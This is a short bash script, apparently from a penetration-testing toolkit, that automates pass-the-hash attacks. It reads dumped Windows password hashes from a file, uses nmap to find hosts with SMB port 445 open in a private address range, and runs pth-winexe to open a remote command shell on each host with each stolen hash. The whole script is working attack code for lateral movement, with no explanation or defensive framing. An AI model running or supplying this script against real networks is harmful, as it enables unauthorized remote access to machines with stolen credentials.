#!/bin/bash
hashfile="/root/bin/passcrack/227/hashes"
for line in $(cat ${hashfile}); do 
  export smbhash=$(echo $line | awk -F: '{print $3 ":" $4}') 
  export smbuser=$(echo $line | awk -F: '{print $1}') 
for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
        echo "[+]"
        echo "[+] trying $smbuser@$host with $smbhash"
        echo "[+]"
        pth-winexe -U $smbuser%$smbhash //$host cmd; 
    done
done
